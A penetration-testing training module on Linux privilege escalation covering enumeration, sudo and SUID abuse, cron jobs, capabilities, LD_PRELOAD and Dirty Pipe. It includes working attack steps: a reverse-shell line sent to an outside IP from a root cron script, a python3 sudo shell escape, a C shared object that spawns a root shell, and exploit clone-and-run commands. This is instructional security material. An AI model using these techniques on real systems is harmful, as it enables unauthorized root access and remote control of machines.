# 01 - Linux Privilege Escalation Techniques

## Introduction

Linux operating systems are widely used due to their powerful, flexible, and open-source nature. However, like any technological system, Linux can be vulnerable to security weaknesses. In this training, we will focus on privilege escalation attacks in Linux operating systems.

Privilege escalation is a process that allows an attacker to gain complete access to the system from limited user rights. In this training, we will start with an introduction to the basic concepts and then delve into various techniques and tools for privilege escalation in Linux operating systems.

Our goal is to provide you with theoretical knowledge while also imparting practical skills, demonstrating how to apply this knowledge in real-world scenarios. Throughout the training, we will cover topics such as sudo, SUID, cron jobs, capabilities, shared libraries, kernel vulnerabilities, and vulnerable services. Additionally, we will use tools and techniques for performing privilege escalation attacks.

The root account in Linux systems provides full administrative access to the operating system. During a penetration test, we may obtain a low-privilege shell on a Linux machine and need to perform privilege escalation to the root account.

Gaining full control of the server, becoming root, allows us to monitor traffic and access sensitive files.

## Enumeration

The key to privilege escalation is enumeration. There are many helper scripts (like LinEnum) available for enumeration. However, it is also important to understand what information to look for and how to perform enumeration manually. Once you get the initial shell access to the server, it is important to check a few key details.

- Operating System Version: Knowing the Linux distribution used on the target system (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) can give you an idea of what tools might be available. Public exploits might also be available for the specific operating system version.
- Kernel Version: Just like the operating system version, there may be public exploits targeting vulnerabilities in specific kernel versions. Kernel exploits can cause system instability and even complete system crashes. Be careful when running these types of exploits on any existing system, and ensure you fully understand the exploit and its potential impact before executing.
- Running Services: Knowing which services are running on the server is crucial, especially those running as root. Misconfigured or vulnerable services running as root can provide a good avenue for privilege escalation attacks. Vulnerabilities have been discovered in many common services like Nagios, Exim, Samba, ProFTPd. For many of these, public exploit PoCs are available (for example CVE-2016-9566 in Nagios Core < 4.2.4).

### Listing Active Processes

Use `ps` to list running processes and identify services running as root.

Example output:

```
root💀hackerbox:~# ps aux | grep root
root           1  0.8  1.1  98992 10920 ?        Ss   01:25   0:01 /sbin/init
root           2  0.0  0.0      0     0 ?        S    01:25   0:00 [kthreadd]
... <SNIP>
```

The `ps` utility provides information about all processes and can help identify potential escalation vectors.

### Installed Packages and Versions

Check installed package versions for known vulnerable software (e.g., older versions of Screen, sudo, etc.). Public exploits for certain versions can often be found on Exploit-DB.

### Logged-In Users

Knowing which users are logged in and what they are doing can provide information about possible local lateral movement and privilege escalation paths.

Example:

```
root💀hackerbox:~# ps au
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         671  0.0  0.1   5880  1072 tty1     Ss+  01:25   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
... <SNIP>
```

### Home Directory Contents of Users

User home folders can contain SSH keys, browser-stored passwords, or configuration files and scripts with credentials used to access other systems. Always check home directories for sensitive files.

Example:

```
root💀hackerbox:~# ls -la
total 184
drwx------ 29 root      root       4096 Mar 15 01:25 .
drwxr-xr-x 18 root      root       4096 Mar 11 00:09 ..
... <SNIP>
```

### SSH Directory Contents

SSH keys in `~/.ssh` may be usable to access other hosts. Check for private keys and known_hosts entries.

```
root💀hackerbox:~# ls -l .ssh
total 12
-rw------- 1 root root 1 Mar 12 02:23 known_hosts
-rw------- 1 root root 1 Mar 12 02:23 id_rsa
-rw-r--r-- 1 root root 1 Mar 12 02:23 id_rsa.pub
```

### Bash History

Bash history may reveal commands, credentials, or scripts executed by users that can hint at escalation paths.

```
root💀hackerbox:~# history
1  ps aux
2  clear 
3  cd /root
4  cat password.txt
... 
```

### Sudo - Listing User Privileges

`sudo -l` reveals commands a user can execute via sudo. NOPASSWD entries are especially interesting.

```
root💀hackerbox:~# sudo -l
Matching Defaults entries for root on hackerbox:
	env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

Runas and Command-specific defaults for root:
	Defaults!/etc/ctdb/statd-callout !requiretty

User root may run the following commands on hackerbox:
	(root) NOPASSWD: /usr/bin/crontab
```

Sometimes a sudo entry allows arbitrary command execution (e.g., `python3 -c '...'`) and can be abused to spawn a root shell.

### Configuration Files

Search configuration files (e.g., `*.conf`, `*.config`) for credentials, API keys, or connection strings.

### Shadow and Passwd Files

If `/etc/shadow` is readable, you can obtain password hashes for offline cracking. On some misconfigured or embedded systems hashes may also be present in `/etc/passwd`.

### Cron Jobs

Scheduled tasks run as specific users (often root). Writable scripts run by root cron jobs are prime escalation vectors.

Example `/etc/crontab` excerpt showing a job running every minute:

```
* *     * * *   root    /usr/local/bin/clean_logs.sh
```

If `clean_logs.sh` is writable by an unprivileged user, it can be modified to execute arbitrary code as root.

### File Systems and Additional Drives

Mounted or unmounted drives may contain backups or credentials. Use `lsblk` and `mount` to inspect available drives and mountpoints.

### SUID and SGID Permissions

Files with the SUID (setuid) bit run with the file owner's permissions (often root). These binaries can be abused if they allow launching shells or executing commands with insufficient validation.

Find SUID files:

```
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

Find SGID files:

```
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

### Finding Writable Directories and Files

Writable directories (e.g., `/tmp`, `/var/tmp`, or custom app directories) and writable scripts or config files used by root processes are useful to find:

```
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

### Abusing Sudo Privileges

When `sudo -l` shows a binary the user can run as root, consider whether that binary allows executing commands. For example, if `python3` is allowed with NOPASSWD, you can escalate with:

```
python3 -c 'import os; os.system("/bin/bash")'
```

### SUID - Special Permissions

The SUID bit appears as an `s` in file permissions. Reverse-engineering or leveraging SUID binaries can lead to privilege escalation.

Example SUID search output:

```
-rwsr-xr-x 1 root root 302904 Mar 14 02:38 /opt/BurpSuiteCommunity/burpbrowser/122.0.6261.111/chrome-sandbox
... 
```

Use GTFOBins (https://gtfobins.github.io) to find abuse cases for common binaries.

## Cron Job Exploitation Example

If a root cron job runs a writable script, edit it to add a reverse shell and listen with `nc -lvp` to receive a root shell when the job executes.

Example:

```
# In /etc/crontab we saw:
* *     * * *   root    /usr/local/bin/backup_log.sh

# The script is writable:
ls -l /usr/local/bin/backup_log.sh
-rwxrwxrwx 1 root root 92 Feb 14 14:20 /usr/local/bin/backup_log.sh

# Append a reverse shell payload to the script (attacker machine 172.18.2.47)
echo "sh -i >& /dev/tcp/172.18.2.47/4444 0>&1" >> /usr/local/bin/backup_log.sh

# On attacker machine:
nc -lvp 4444
```

When the cron runs, the reverse shell connects back as root.

## Capabilities

Linux capabilities allow assigning specific privileges to executables without granting full root. Misconfigured capabilities (e.g., `cap_sys_admin`, `cap_dac_override`) can be abused.

Set capabilities with `setcap`, list with `getcap`.

Example to list capabilities recursively:

```
/usr/sbin/getcap -r / 2>/dev/null
```

Example output entries: `/usr/bin/ping cap_net_raw=ep`, `/usr/bin/vim cap_net_bind_service=+ep`.

Capabilities like `cap_setuid` or `cap_dac_override` can be especially powerful.

## Shared Libraries and LD_PRELOAD

Dynamic libraries can be controlled to alter binary behavior. If an environment variable like `LD_PRELOAD` is preserved by `sudo` for a given command, it can be abused to load a custom shared object and escalate privileges.

Example escalate.c to set root IDs and spawn a shell via `_init()`:

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	unsetenv("LD_PRELOAD");
	setresuid(0, 0, 0);
	system("/bin/bash -p"); 
}
```

Compile and use with `sudo LD_PRELOAD=/tmp/escalate.so /usr/local/bin/sys_backup` (if `LD_PRELOAD` is kept by the sudoers entry).

## Dirty Pipe (CVE-2022-0847)

Dirty Pipe is a kernel vulnerability that allows unprivileged users to write to files they can read, affecting kernels 5.8+ up to 5.15.25. Exploits allow modification of `/etc/passwd` or dropping SUID shells. Use publicly available PoCs carefully and only on systems you are authorized to test.

Typical workflow:

```
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh
./exploit-1  # may modify /etc/passwd or spawn shell
./exploit-2 /usr/bin/su  # hijack SUID binary
```

## Vulnerable Services and Known Exploits

Services like Screen, Exim, Samba, and others have had local privilege escalation bugs. Identify service versions (e.g., `screen -v`) and search Exploit-DB or vendor advisories for available PoCs.

### Screen example

Screen 4.05.00 has a local root exploit that can be used to overwrite `/etc/ld.so.preload` and escalate.

Proof-of-concept steps generally involve creating a malicious shared library and a rootshell, using screen to write to `/etc/ld.so.preload`, and obtaining a root shell.

## Tools and Resources

Enumeration tools that speed up discovery (use responsibly):

- LinPEAS: https://github.com/carlospolop/PEASS-ng
- LinEnum: https://github.com/rebootuser/LinEnum
- LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
- Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enum
- Metasploit Framework Linux Exploit Suggester

Exploit databases and references:

- Exploit-DB: https://www.exploit-db.com/
- GTFOBins: https://gtfobins.github.io/

## Final Notes

Privilege escalation requires careful enumeration, an understanding of Linux internals, and caution when running exploits (risk of system instability). Always test on authorized targets or lab environments.

Practice with the included labs and tools in this repository to become comfortable identifying and exploiting misconfigurations and vulnerabilities responsibly.


